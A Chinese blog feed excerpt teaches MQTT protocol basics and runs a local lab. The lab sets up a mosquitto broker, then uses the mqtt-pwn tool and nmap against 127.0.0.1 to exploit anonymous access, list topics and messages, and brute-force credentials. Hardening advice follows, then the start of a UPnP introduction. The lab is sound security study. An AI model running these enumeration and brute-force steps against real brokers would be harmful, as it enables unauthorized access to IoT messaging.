    <content type="html"><![CDATA[<h4 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h4><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820111643162.png" alt="image-20240820111643162"></p><p>MQTT最大优点在于，<strong>用极少的代码和有限的带宽，为连接远程设备提供实时可靠的消息服务</strong>。</p><p>作为一种低开销、低带宽占用的即时通讯协议，使其在物联网、小型设备、移动应用等方面有较广泛的应用。</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820111807164.png" alt="image-20240820111807164"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs markdown">MQTT（Message Queuing Telemetry Transport）协议是一种轻量级的消息传输协议，专为资源有限的设备和网络环境设计。它主要用于物联网（IoT）应用中，具有以下几个核心特点：<br><br><span class="hljs-bullet">1.</span> 协议架构<br>客户端：与MQTT代理（Broker）通信的设备或应用程序，既可以是发布者也可以是订阅者。<br>代理（Broker）：中介服务器，负责接收客户端的消息并将其转发到相应的订阅者。<br><span class="hljs-bullet">2.</span> 发布/订阅模式<br>发布：客户端将消息发送到一个主题（Topic），这条消息会被代理转发给所有订阅了该主题的客户端。<br>订阅：客户端订阅感兴趣的主题，接收到相关的消息。<br><span class="hljs-bullet">3.</span> 服务质量（QoS）等级<br>MQTT支持三种服务质量等级：<br><br>QoS 0（至多一次）：消息可能会丢失，不会被重试。<br>QoS 1（至少一次）：确保消息至少到达一次，但可能会重复。<br>QoS 2（只有一次）：确保消息只到达一次，最严格的保证。<br><span class="hljs-bullet">4.</span> 保持连接（Keep Alive）<br>MQTT支持保持连接机制，通过心跳包（Ping）来维持和检测客户端与代理的连接，确保通信的持续性。<br><br><span class="hljs-bullet">5.</span> 遗嘱消息（Last Will and Testament）<br>客户端在连接时可以设置一条“遗嘱”消息，若客户端异常断开，代理会将遗嘱消息发布到指定主题，通知其他客户端。<br><br><span class="hljs-bullet">6.</span> 小型数据包<br>MQTT协议的数据包设计小巧高效，适合低带宽和高延迟的网络环境，尤其适合在资源受限的设备和网络中使用。<br><br><span class="hljs-bullet">7.</span> 安全性<br>虽然MQTT协议本身并不提供安全机制，但它可以与TLS/SSL等安全层一起使用，以确保数据传输的安全性。<br><br>使用场景<br>MQTT广泛应用于各种物联网（IoT）应用场景，如：<br><br>智能家居：智能灯光、温控设备等。<br>工业监控：设备状态监测、故障报警等。<br>车联网：车辆数据传输、实时监控等。<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820111904966.png" alt="image-20240820111904966"></p><h5 id="mqtt客户端测试"><a href="#mqtt客户端测试" class="headerlink" title="mqtt客户端测试"></a>mqtt客户端测试</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/thomasnordquist/</span>MQTT-Explorer<br></code></pre></td></tr></table></figure><h5 id="mqtt的两种模式"><a href="#mqtt的两种模式" class="headerlink" title="mqtt的两种模式"></a>mqtt的两种模式</h5><h6 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式:"></a>发布订阅模式:</h6><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/866b7d10822d3660b7830a0ac5e316c.png" alt="在这里插入图片描述"><br>客户端只需要订阅这个主题，当有其他客户端向这个服务端发布消息时，这个客户端就可以收到这个消息</p><h6 id="请求响应模式"><a href="#请求响应模式" class="headerlink" title="请求响应模式"></a>请求响应模式</h6><p>请求响应模式: 客户端向服务端发送请求，服务端收到请求后，向客户端返回响应<br><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/5b56abcbe0090b7209b5d385a8c4e6f.png" alt="在这里插入图片描述"></p><h5 id="MQTT协议主要特性"><a href="#MQTT协议主要特性" class="headerlink" title="MQTT协议主要特性"></a>MQTT协议主要特性</h5><ol><li><p>开放消息协议，简单易实现。</p></li><li><p>使用发布&#x2F;订阅消息模式，提供一对多的消息发布，解除应用程序耦合。</p></li><li><p>对负载（协议携带的应用数据）内容屏蔽的消息传输。</p></li><li><p><strong>基于TCP&#x2F;IP网络连接,提供有序，无损，双向连接。主流的MQTT是基于TCP连接进行数据推送的，但是同样有基于UDP的版本，叫做MQTT-SN。这两种版本由于基于不同的连接方式，优缺点自然也就各有不同了。由于基于不同的连接方式，优缺点自然也就各有不同了。</strong></p></li><li><p>消息服务质量(QoS）支持，可靠传输保证;有三种消息发布服务质量:<br>QoS0:“至多一次”，消息发布完全依赖底层TCP&#x2F;IP网络。会发生消息丢失或重复。这一级别可用于如下情况，环境传感器数据，丢失一次读记录无所谓，因为不久后还会有第二次发送。这一种方式主要普通APP的推送，倘若你的智能设备在消息推送时未联网，推送过去没收到，再次联网也就收不到了。</p><p>QoS1:“至少—次”，确保消息到达，但消息重复可能会发生。</p><p>QoS2:“只有一次”，确保消息到达一次。在一些要求比较严格的计费系统中，可以使用此级别。在计费系统中，消息重复或丢失会导致不正确的结果。这种最高质量的消息发布服务还可以用于即时通讯类的APP的推送，确保用户收到且只会收到一次。</p></li><li><p>1字节固定报头，2字节心跳报文，最小化传输开销和协议交换，有效减少网络流量。<br>这就是为什么在介绍里说它非常适合”在物联网领域，传感器与服务器的通信，信息的收集，要知道嵌入式设备的运算能力和带宽都相对薄弱，使用这种协议来传递消息再适合不过了。</p></li><li><p>在线状态感知:使用Last Will和Testament特性通知有关各方客户端异常中断的机制。<br>Last Will:即遗言机制，用于通知同一主题下的其他设备，发送遗言的设备已经断开了连接。<br>Testament:遗嘱机制，功能类似于Last Will。</p></li></ol><h5 id="MQTT的发布-订阅、主题、会话"><a href="#MQTT的发布-订阅、主题、会话" class="headerlink" title="MQTT的发布&#x2F;订阅、主题、会话"></a>MQTT的发布&#x2F;订阅、主题、会话</h5><p>MQTT是基于<strong>发布(Publish)</strong>&#x2F;<strong>订阅(Subscribe)模式来进行通信及数据交换的，与HTTP的请求(Request)</strong>&#x2F;**应答(Response)**的模式有本质的不同<br>订阅者(Subscriber)会向消息服务器(Broker)订阅一个主题(Topic)。成功订阅后，消息服务器会将该主题下的消息转发给所有订阅者<br>主题(Topic)以’&#x2F;‘为分隔符区分不同的层级，包含通配符’+’ 或 ‘#’的主题又称为主题过滤器(Topic Filters); 不含通配符的成为主题名(Topic Names) 例如:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">sensor<span class="hljs-regexp">/10/</span>temperature<br>sensor<span class="hljs-regexp">/+/</span>temperature<br><span class="hljs-variable">$SYS</span><span class="hljs-regexp">/broker/m</span>etrics<span class="hljs-regexp">/packets/</span>received<br><span class="hljs-variable">$SYS</span><span class="hljs-regexp">/broker/m</span>etrics/<span class="hljs-comment">#</span><br><br><span class="hljs-string">&#x27;+&#x27;</span> : 表示通配一个层级， 例如a<span class="hljs-regexp">/+，匹配a/</span>x, a/y<br></code></pre></td></tr></table></figure><p>发布者(Publisher)只能向主题名发布消息，订阅者(Subscriber)则可以通过订阅主题过滤器来通配多个主题名称</p><h6 id="会话-Session"><a href="#会话-Session" class="headerlink" title="会话(Session)"></a><strong>会话(Session)</strong></h6><p>每个客户端与服务器建立连接后就是一个会话，客户端和服务器之间有状态交互。会话存在于一个网络之间，也可能在客户端和服务器之间跨越多个连续的网络连接。</p><h5 id="MQTT协议中的方法"><a href="#MQTT协议中的方法" class="headerlink" title="MQTT协议中的方法"></a>MQTT协议中的方法</h5><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">MQTT协议中定义了一些方法(也被称为动作)，来于表示对确定资源所进行操作。这个资源可以代表预先存在的数据或动态生成数据，这取决于服务器的实现。通常来说，资源指服务器上的文件或输出。主要方法有:</span><br><br><span class="hljs-section">CONNECT: 客户端连接到服务器</span><br><span class="hljs-section">CONNACK: 连接确认</span><br><span class="hljs-section">PUBLISH: 发布消息</span><br><span class="hljs-section">PUBACK: 发布消息确认</span><br><span class="hljs-section">PUBREC: 发布的消息已接收</span><br><span class="hljs-section">PUBREL: 发布的消息已释放</span><br><span class="hljs-section">PUBCOMP: 发布完成</span><br><span class="hljs-section">SUBSCRIBE: 订阅请求</span><br><span class="hljs-section">SUBACK: 订阅确认</span><br><span class="hljs-section">UNSUBSCRIBE: 取消订阅</span><br><span class="hljs-section">UNSUBACK: 取消订阅确认</span><br><span class="hljs-section">PINGREQ: 客户端发送心跳</span><br><span class="hljs-section">PINGRESP: 服务端心跳响应</span><br><span class="hljs-section">DISCONNECT: 断开连接</span><br><span class="hljs-section">AUTH: 认证</span><br></code></pre></td></tr></table></figure><h5 id="数据包结构"><a href="#数据包结构" class="headerlink" title="数据包结构"></a>数据包结构</h5><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240819202638142.png" alt="image-20240819202638142"></p><h6 id="固定头部（Fixed-Header）"><a href="#固定头部（Fixed-Header）" class="headerlink" title="固定头部（Fixed Header）"></a>固定头部（Fixed Header）</h6><p>固定头部是 MQTT 数据包的必有部分，它包含了数据包的类型和控制标志位。固定头部的结构如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">固定头部 (1 byte)：<br><span class="hljs-code">    7     6     5     4     3     2     1     0</span><br><span class="hljs-code">+-----+-----+-----+-----+-----+-----+-----+-----+</span><br><span class="hljs-code">|                数据包类型（4 bits）              |</span><br><span class="hljs-code">+-----+-----+-----+-----+-----+-----+-----+-----+</span><br><span class="hljs-code">|               控制标志位（4 bits）               |</span><br><span class="hljs-code">+-----+-----+-----+-----+-----+-----+-----+-----+</span><br></code></pre></td></tr></table></figure><p>其中，数据包类型占据了固定头部的前 4 个字节，用于表示数据包的类型。而控制标志位占据了固定头部的后 4 个字节，用于传递与数据包类型相关的标志信息。</p><h6 id="可变头部（Variable-Header）"><a href="#可变头部（Variable-Header）" class="headerlink" title="可变头部（Variable Header）"></a>可变头部（Variable Header）</h6><p>可变头部是 MQTT 数据包类型特定的部分，它的长度和内容取决于数据包的类型。可变头部的结构如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">可变头部 (不定长)：<br><span class="hljs-code">    根据数据包类型和协议规定</span><br></code></pre></td></tr></table></figure><p>可变头部的长度和内容根据具体的数据包类型和协议规定而有所不同。例如，在 CONNECT 数据包中，可变头部包含了与连接相关的参数，如协议版本号、客户端标识符等。而在 PUBLISH 数据包中，可变头部则包含了消息的 QoS 等级、是否保留、主题名称等信息。</p><h6 id="有效载荷（Payload）"><a href="#有效载荷（Payload）" class="headerlink" title="有效载荷（Payload）"></a>有效载荷（Payload）</h6><p>有效载荷是 MQTT 数据包类型特定的数据部分，它携带了实际的消息内容。有效载荷的结构如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">有效载荷 (不定长)：<br><span class="hljs-code">    根据数据包类型和协议规定</span><br></code></pre></td></tr></table></figure><p>有效载荷的长度和内容也根据具体的数据包类型和协议规定而有所不同。在 PUBLISH 数据包中，有效载荷就是要发布的消息内容。</p><h6 id="数据包交互"><a href="#数据包交互" class="headerlink" title="数据包交互"></a>数据包交互</h6><p>MQTT 数据包通过客户端和服务端之间的交互来实现消息的传递。典型的 MQTT 数据包交互流程如下：</p><ol><li>客户端发送 CONNECT 数据包到服务端，用于建立连接。</li><li>服务端发送 CONNACK 数据包作为连接确认回复。</li><li>客户端发送 PUBLISH 数据包发布消息。</li><li>服务端根据消息的 QoS 等级发送相应的确认数据包（PUBACK、PUBREC、PUBREL、PUBCOMP）。</li><li>客户端根据需要发送订阅（SUBSCRIBE）或取消订阅（UNSUBSCRIBE）数据包。</li><li>服务端发送 SUBACK 或 UNSUBACK 数据包作为订阅或取消订阅的确认回复。</li><li>客户端和服务端通过 PINGREQ 和 PINGRESP 数据包进行心跳保持。</li><li>最后，客户端发送 DISCONNECT 数据包断开连接。</li></ol><h5 id="安装mqtt服务"><a href="#安装mqtt服务" class="headerlink" title="安装mqtt服务"></a>安装mqtt服务</h5><p>sudo apt-get install mosquitto mosquitto-clients -y</p><p>sudo vim &#x2F;etc&#x2F;mosquitto&#x2F;mosquitto.conf</p><p>在配置文件中添加这三行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">listener 1883<br>allow_anonymous <span class="hljs-literal">true</span><br>password_file /etc/mosquitto/pwfile.example<br>listener是MQTT监听的端口号，可以自行修改。<br>allow_anonymous是匿名访问漏洞的罪魁祸首，当为<span class="hljs-literal">true</span>时，便支持匿名访问，为<span class="hljs-literal">false</span>则禁止匿名访问。<br>password_file是存放MQTT账号密码的文件参数。<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820134023892.png" alt="image-20240820134023892"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> systemctl restart mosquitto<br></code></pre></td></tr></table></figure><p>创建password_file空文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">touch</span> /etc/mosquitto/pwfile.example<br></code></pre></td></tr></table></figure><p>创建test用户和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mosquitto_passwd /etc/mosquitto/pwfile.example <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820155547822.png" alt="image-20240820155547822"></p><p>客户端订阅（像是监听）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mosquitto_sub -t testtopic -u <span class="hljs-built_in">test</span> -P 123456<br></code></pre></td></tr></table></figure><p>客户端发布 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> mosquitto_pub -t testtopic -u <span class="hljs-built_in">test</span> -P 123456 -m testmessage<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820155732290.png" alt="image-20240820155732290"></p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820155816184.png" alt="image-20240820155816184"></p><p>订阅端功收到testmessage</p><p>wireshark抓包看一下</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820160512580.png" alt="image-20240820160512580"></p><h5 id="mqtt-pwn"><a href="#mqtt-pwn" class="headerlink" title="mqtt-pwn"></a>mqtt-pwn</h5><p>docker安装</p><p><a href="https://www.cnblogs.com/spmonkey/p/17919346.html">记录一次对MQTT协议的渗透测试经历 - spmonkey - 博客园 (cnblogs.com)</a></p><p>测试</p><p>ubuntu18 conda</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">conda <span class="hljs-built_in">activate</span> mqtt-pwn<br></code></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> ~/tool/mqtt-pwn<br><span class="hljs-keyword">python</span> run.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820165144641.png" alt="image-20240820165144641"></p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">connect -o <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-comment">//连接mqtt的ip和端口，输入system_info验证是否连接成功</span><br></code></pre></td></tr></table></figure><p>出现MQTT协议基础信息，证明存在MQTT匿名访问漏洞。</p><p>输入discovery进行扫描</p><p>等到finish后再执行scans查看</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">scans</span> -i <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>&#x2F;&#x2F;ps:类似于</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sV -sC -p1883 -v <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>执行topic查看所有话题</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820192215504.png" alt="image-20240820192215504"></p><p>执行messages查看所有消息</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820192238791.png" alt="image-20240820192238791"></p><p>抓到了自己发的message</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820193850949.png" alt="image-20240820193850949"></p><p><strong>暴力破解</strong></p><p>把mosquitto.conf 中的allow_anomonys 设置为false ，重启服务</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir">iot<span class="hljs-variable">@research</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo vi /etc/mosquitto/mosquitto.conf <br>iot<span class="hljs-variable">@research</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>systemctl restart mosquitto.service <br></code></pre></td></tr></table></figure><p>进入到mqtt-pwn  默认为1883</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-meta prompt_">&gt;&gt;</span> bruteforce --host <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/mage-20240820182826415.png" alt="image-20240820182826415"></p><p>破解成功</p><p>UpNp协议在物联网中与mqtt的作用相似，都是用于设备之间的交互，发送命令。</p><h5 id="mqtt的安全建议"><a href="#mqtt的安全建议" class="headerlink" title="mqtt的安全建议"></a>mqtt的安全建议</h5><ol><li><strong>使用加密</strong></li></ol><ul><li><strong>TLS&#x2F;SSL 加密</strong>：确保 MQTT 服务器和客户端之间的通信通过 TLS（Transport Layer Security）或 SSL（Secure Sockets Layer）加密。这可以防止数据在传输过程中被窃听或篡改。</li><li><strong>证书管理</strong>：使用有效的数字证书来验证服务器的身份，并确保客户端能够验证服务器的证书。</li></ul><ol start="2"><li><strong>身份验证和授权</strong></li></ol><ul><li><strong>用户名和密码</strong>：要求 MQTT 客户端在连接时提供用户名和密码。虽然这不是最强的安全措施，但它是一个基本的身份验证步骤。</li><li><strong>更强的认证机制</strong>：可以使用更复杂的认证机制，如基于令牌的认证或集成 OAuth 2.0。</li><li><strong>访问控制</strong>：设置细粒度的权限控制，确保客户端只能访问和操作其被授权的主题和资源。</li></ul><ol start="3"><li><strong>确保 MQTT 代理的安全配置</strong></li></ol><ul><li><strong>限制连接</strong>：仅允许可信的客户端连接到 MQTT 代理。可以通过 IP 白名单或防火墙规则实现。</li><li><strong>防止匿名访问</strong>：禁用匿名连接，确保所有客户端都经过身份验证。</li></ul><ol start="4"><li><strong>消息加密</strong></li></ol><ul><li><strong>应用层加密</strong>：对于高安全需求的应用，考虑对消息本身进行加密，确保即使数据被拦截，攻击者也无法解读消息内容。</li></ul><ol start="5"><li><strong>定期更新和维护</strong></li></ol><ul><li><strong>软件更新</strong>：定期更新 MQTT 代理和客户端软件，以修补已知的安全漏洞。</li><li><strong>监控和日志</strong>：启用监控和日志记录，以便可以追踪和分析安全事件。</li></ul><ol start="6"><li><strong>使用安全的 MQTT 代理</strong></li></ol><ul><li><strong>选择可靠的 MQTT 代理</strong>：使用经过安全性验证和审查的 MQTT 代理，如 Eclipse Mosquitto、HiveMQ 或其他商业解决方案，确保其具备强大的安全功能。</li></ul><ol start="7"><li><strong>防御 DDoS 攻击</strong></li></ol><ul><li><strong>流量控制</strong>：配置流量限制和连接限制，以防止分布式拒绝服务（DDoS）攻击。</li><li><strong>资源隔离</strong>：使用专用的资源和服务实例来隔离不同的 MQTT 客户端和流量，以减少攻击对系统的影响。</li></ul><ol start="8"><li><strong>数据保护</strong></li></ol><ul><li><strong>数据隐私</strong>：确保遵守相关的数据保护法律和法规，尤其是在处理敏感信息时。</li><li><strong>备份和恢复</strong>：定期备份 MQTT 数据，并测试数据恢复过程，以防数据丢失或系统故障。</li></ul><ol start="9"><li><strong>防止中间人攻击</strong></li></ol><ul><li><strong>证书验证</strong>：确保客户端和服务器都验证对方的证书，防止中间人攻击。</li><li><strong>固定客户端身份</strong>：使用客户端证书或其他方法确保每个客户端都有唯一标识，并且能够验证其真实性。</li></ul><p>通过实施这些安全措施，可以显著提高 MQTT 系统的安全性，保护数据传输的隐私性和完整性。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>upnp协议学习及漏洞复现</title>
    <link href="/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2024/08/14/upnp%E5%8D%8F%E8%AE%AE%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h4 id="upnp"><a href="#upnp" class="headerlink" title="upnp"></a>upnp</h4><h5 id="upnp简介"><a href="#upnp简介" class="headerlink" title="upnp简介"></a>upnp<strong>简介</strong></h5><p><strong>通用即插即用</strong>（英语：Universal Plug and Play，简称<strong>UPnP</strong>）是由“通用即插即用论坛”（UPnP™ Forum）推广的一套网络协议，主要用于设备的智能互联互通。</p><p>UPnP可以当作是一个相对复杂的网络协议，毕竟它包含了很多其他的网络协议，如：ip（设备寻址）、tcp、udp（数据打包发送）、http（数据传递格式）等。</p><p>UPnP可以扩展，也就是说还可以在启动加入其他的协议，比如：传递数据时，http协议再包一层json协议，或者数据传递使用xml协议来传递等等。</p><p>UPnP之所以强大，很大一个原因是基于互联网，这样对等设备可以通过互联网自由交互，也就是说任何可以联网的设备都可以使用UPnP协议。</p><p><strong>UPnP用法</strong></p><h6 id="（1）寻址——Addressing"><a href="#（1）寻址——Addressing" class="headerlink" title="（1）寻址——Addressing"></a>（1）寻址——Addressing</h6><p>因为基于互联网，需要满足基本的p2p协议，所以就必须要寻址，寻址的过程就是设备获取ip地址的过程，这个里面一般都使用DHCP（Dynamic Host Configuration Protocol，动态主机配置协议），即路由动态的分配一个没有使用的ip地址给设备。</p><h6 id="（2）发现——Discovery"><a href="#（2）发现——Discovery" class="headerlink" title="（2）发现——Discovery"></a>（2）发现——Discovery</h6><p>UPnP通过SSDP（简单服务发现协议）完成设备的发现。通过寻址拥有了身份标识IP，加入了互联网当中。新加入的设备向UPnP专用</p><p>的组播地址（239.255.255.250:1900）发送消息宣告自己的存在。</p><h6 id="（3）描述——Description"><a href="#（3）描述——Description" class="headerlink" title="（3）描述——Description"></a>（3）描述——Description</h6><p>在设备发现的过程中，设备描述文件的URL包含在设备加入网络</p><p>时发送的消息中，也就是LOCATION中的描述url，通过location中的url能获取一个xml，一般设备的描述都是通过xml来标识的。</p><h6 id="（4）控制——Control"><a href="#（4）控制——Control" class="headerlink" title="（4）控制——Control"></a>（4）控制——Control</h6><p>UPnP通过SOAP协议控制设备，按照XML描述文件中的信息，以</p><p>Device（设备）+Service（设备的服务）+action（动作）+Variable</p><p>（值）的形式控制设备。一个控制的过程包含控制地址、控制说明、控制执行、控制响应。</p><h6 id="（5）事件——Eventing"><a href="#（5）事件——Eventing" class="headerlink" title="（5）事件——Eventing"></a>（5）事件——Eventing</h6><p>事件即设备的状态量发生了变化，需注册一个观察者。当状态量发生了变化时，设备会提示观察者状态量发生变化，并及时处理。</p><h6 id="（6）展示——Presentation"><a href="#（6）展示——Presentation" class="headerlink" title="（6）展示——Presentation"></a>（6）展示——Presentation</h6><p>展示作为一个控制和事件的补充，实现upnp协议并不强制要求。</p><h5 id="主要特点"><a href="#主要特点" class="headerlink" title="主要特点"></a>主要特点</h5><ol><li><strong>自动发现</strong>：UPnP 允许设备在同一网络中通过广播和多播消息自动发现其他设备。例如，当一个新设备连接到网络时，它可以使用 SSDP（Simple Service Discovery Protocol）向其他设备发送通知。</li><li><strong>即插即用</strong>：用户只需将设备连接到网络，无需手动配置或设置。设备能够自我描述其功能，并与其他设备进行交互。</li><li><strong>跨平台支持</strong>：UPnP 设计为跨操作系统和设备类型工作，支持各种类型的设备，如打印机、路由器、智能家居设备、媒体播放器等。</li><li><strong>灵活性和可扩展性</strong>：UPnP 支持多种类型的应用场景，包括家庭网络、企业网络以及广域网应用，使其具有很高的灵活性和可扩展性。</li></ol><h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><ol><li><strong>设备发现</strong>：使用 SSDP，UPnP 设备能够通过网络广播其存在，其他设备可以接收这些广播以了解网络中可用的设备。</li><li><strong>服务描述</strong>：发现设备后，其他设备可以请求该设备提供的服务的描述信息。设备使用 XML 文件来描述其服务、功能、事件和操作。</li><li><strong>控制和管理</strong>：设备可以通过 HTTP 请求对其他设备进行控制和管理。UPnP 定义了一些标准的控制命令，允许设备之间进行交互。</li><li><strong>事件通知</strong>：UPnP 设备可以发布事件通知，告知其他设备其状态或属性的变化。这使得设备能够保持同步并响应网络中的变化。</li></ol><h5 id="upnp工作在哪一层？"><a href="#upnp工作在哪一层？" class="headerlink" title="upnp工作在哪一层？"></a>upnp工作在哪一层？</h5><p>UPnP（Universal Plug and Play）协议主要工作在应用层，但它依赖于多个网络协议层来实现其功能。UPnP 的核心目标是使设备在网络上能够自动发现彼此并进行通信。下面是 UPnP 协议如何与不同网络层交互的简要说明：</p><h6 id="1-应用层"><a href="#1-应用层" class="headerlink" title="1. 应用层"></a>1. <strong>应用层</strong></h6><ul><li><strong>UPnP 的核心</strong>：UPnP 是一个应用层协议，旨在简化网络设备的自动发现和服务配置。它定义了设备如何在网络上自我描述以及如何提供服务。它包括一套 XML 描述和控制协议，使得设备能够在网络上公开它们的服务并让其他设备能够发现和使用这些服务。</li><li><strong>服务描述</strong>：设备通过使用 XML 文件描述其服务、功能和能力，其他设备可以通过这些描述了解并使用这些服务。</li></ul><h6 id="2-传输层"><a href="#2-传输层" class="headerlink" title="2. 传输层"></a>2. <strong>传输层</strong></h6><ul><li><strong>HTTP</strong>：UPnP 使用 HTTP 协议作为其控制协议的一部分。UPnP 设备通过 HTTP 请求来发现设备和服务、获取描述信息以及执行控制命令。这包括使用 HTTP 的 POST、GET 和 NOTIFY 方法来交换信息。</li></ul><h6 id="3-网络层"><a href="#3-网络层" class="headerlink" title="3. 网络层"></a>3. <strong>网络层</strong></h6><ul><li><strong>SSDP（Simple Service Discovery Protocol）</strong>：为了进行设备和服务的发现，UPnP 使用 SSDP 协议，这是一种基于 UDP 的协议，工作在网络层。SSDP 允许设备通过广播消息来宣布它们的存在，并接收其他设备的发现请求。</li></ul><h6 id="4-数据链路层"><a href="#4-数据链路层" class="headerlink" title="4. 数据链路层"></a>4. 